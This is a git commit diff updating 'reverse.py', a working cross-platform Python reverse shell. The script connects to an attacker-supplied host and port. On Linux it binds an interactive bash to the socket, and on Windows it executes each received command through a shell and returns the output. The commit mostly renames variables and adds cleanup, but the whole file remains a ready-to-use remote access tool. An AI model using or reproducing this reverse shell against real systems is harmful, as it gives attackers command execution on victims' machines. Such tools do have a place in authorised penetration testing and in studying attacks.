3885b1f96814db0d33e205f3f034e70cb96a482b
joetanx <90442032+joetanx@users.noreply.github.com>
2026-04-13 08:08:59 +0800

    Update reverse.py

--- reverse.py
+++ reverse.py
@@ -1,24 +1,28 @@
 import socket, subprocess, os, sys, platform
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((sys.argv[1],int(sys.argv[2])))
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.connect((sys.argv[1],int(sys.argv[2])))
 
 if platform.system() == 'Linux':
-  os.dup2(s.fileno(),0)
-  os.dup2(s.fileno(),1)
-  os.dup2(s.fileno(),2)
-  p=subprocess.run(['/bin/bash', '-i'])
+  os.dup2(sock.fileno(),0)
+  os.dup2(sock.fileno(),1)
+  os.dup2(sock.fileno(),2)
+  proc = subprocess.run(['/bin/bash', '-i'])
 elif platform.system() == 'Windows':
   while 1:
-    s.send(str.encode(os.getcwd() + '> '))
-    data = s.recv(1024).decode('UTF-8')
+    sock.send(str.encode(os.getcwd() + '> '))
+    data = sock.recv(1024).decode('UTF-8')
     data = data.strip('\n')
-    if data == 'quit': 
+    if data == 'exit': 
       break
-    if data[:2] == 'cd':
+    elif data[:2] == 'cd':
       os.chdir(data[3:])
-    if len(data) > 0:
+    elif len(data) > 0:
       proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
       stdout_value = proc.stdout.read() + proc.stderr.read()
       output_str = str(stdout_value, 'UTF-8')
-      s.send(str.encode("\n" + output_str))
+      sock.send(str.encode("\n" + output_str))
+
+proc.terminate()
+proc.wait()
+sock.close()
